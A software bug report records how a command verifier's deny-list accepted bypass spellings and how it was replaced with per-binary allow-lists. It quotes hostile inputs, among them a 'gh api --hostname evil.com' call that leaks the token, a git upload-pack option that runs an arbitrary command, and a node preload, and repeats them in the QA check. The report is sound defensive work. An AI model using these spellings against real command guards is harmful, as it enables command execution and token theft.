# Bug Report: Task 110 - The deny-list whitelist mechanism cannot hold against prefix-accepting CLIs

**Task**: [Link](./task.110.session-handoff-skill.md)
**Bug ID**: TASK-110-BUG-4
**Severity**: HIGH
**Priority**: P1
**Status**: ✅ Ready for QA
**Found By**: QA Engineer
**Date Found**: 2026-09-15

## Description

Gate 2 (cycle 2 refute pass + fresh re-probe) found seven HIGH and three MEDIUM acceptances that share one root cause: the whitelist enumerates what is *forbidden* per binary, and the binaries accept forms the enumeration did not name —

- git long-option **prefixes** (`git branch --del x`, `--set-upstream-t=`), reproduced against git
- decorating flags that do not select a mode (`git remote -v add …`, `git branch -v newname`)
- exec-shaped options on "read" subcommands (`git ls-remote --upload-pack=<cmd> .` runs `<cmd>`)
- joined forms (`npx prettier --write=.`)
- `--check` anywhere in `npm run <script>` (`npm run format --check` → `prettier --write .`; `npm run generate-catalog -- --check` → regenerates)
- `gh api --hostname evil.com …` — exfiltrates the token
- npm scripts trusted by suffix (`lint:fix`); npx tools that write by default (`tsc` without `--noEmit`, `-o`, `--coverage`); `date <positional>` sets the clock

## Expected Behavior

Unknown flag ⇒ refused. An allow-list per binary — exact flags and their `=value` forms, positional policy — refuses prefixes, joined forms and exec options by construction.

## Actual Behavior

Each new spelling passes until someone thinks of it.

## Impact

Same as bug.1: a committed handoff can execute a mutating command, or send the gh token elsewhere, under a read-only contract.

## Recommendation

Replace, do not patch: per-binary allow-lists; remove `--hostname`; `--check` only as `npm run bundle -- --check`; enumerate npm scripts exactly; npx per-tool allow-lists; `date` only `+format`; property test that every accepted argv contains only allow-listed flags.

## Developer Fix Cycle

### Iteration 1

#### Investigation (New → In Progress)

**Date**: 2026-09-15 · **Developer**: Claude (qa-fix, cycle 2)

**Root Cause**: the mechanism. A deny-list must name every spelling a CLI accepts; git accepts option prefixes, npm forwards unknown flags, gh joins flags with `=`. No amount of enumeration closes that.

#### Fix Implementation (In Progress → Ready for QA) — mechanism REPLACED, not patched

**Fix Description**:
- Every binary now has an **allow-list spec** (`checkArgs`): flags as exact names or `name=` value forms, a positional policy (`none` / relative `paths` / `any`), optional `requirePositionalWhen` (branch/tag) and `requireFlag` (tsc `--noEmit`). A dash token not in the spec is refused — prefixes, joined forms, exec-shaped options and `--check` on arbitrary scripts all fall out of "unknown ⇒ refused".
- git: `GIT_SPECS` per subcommand; no global options; `remote` only bare/`-v`/`show`/`get-url`; `branch`/`tag` positional only with a list-selecting flag (`-v` is not one).
- gh: `api <path>` first, then read-shaping flags only (`--hostname` gone); list/view flags enumerated (`--web` gone).
- node/python3: leading flags allow-listed; `--test-reporter=` built-in names only; script relative; **in `--test` mode every later dash token is held to the list** (the cycle-2 re-probe found `node --test x/ -r ./pre.js` preloads `pre.js` — verified by execution).
- npm: exact script names; `bundle` only as `run bundle -- --check`; `eval:*` bare.
- npx: per-tool specs; `tsc` requires `--noEmit`.
- utilities: per-binary specs; `tail -f` gone; `date` positional only `+format`; plain readers may read absolute paths.
- Operators judged per token after quoting (`grep -E 'a|b'` allowed; `git log |head`, `cat x>y` refused); newline refused on the raw string.
- Runner is **async** (`spawn`, detached), kills the group on timeout **and** on SIGINT/SIGTERM to the verifier; `verify()`/`run()` are async.

**Files Modified**: `handoff-verify.mjs`, `handoff-verify.test.js`, `SKILL.md`.

**Testing**: 27/27; corpus 0/73 hostile accepted; 170-spelling re-probe → 0 unexpected accepts; property test (unknown flag refused on every binary/subcommand); mutation-proved: `checkArgs` accepting unknown flags → 3 tests red; SIGINT handler removed → CR-7 test red; test-mode pass-through → refused-list red.

**Verification Steps for QA**: `command node -e 'import("./skills/session-handoff/scripts/handoff-verify.mjs").then(m=>console.log(["git branch --del x","git remote -v add e x","npm run format --check","gh api --hostname evil.com repos/x","git ls-remote --upload-pack=echo .","node --test x/ -r ./pre.js"].map(c=>m.isAllowed(c).ok)))'` → all `false`.

## Status History

| Date | Status | Changed By | Notes |
| --- | --- | --- | --- |
| 2026-09-15 | New | QA Engineer | Gate 2 refute pass + re-probe |
| 2026-09-15 | Ready for QA | Claude (qa-fix) | Deny-lists replaced by per-binary allow-lists |
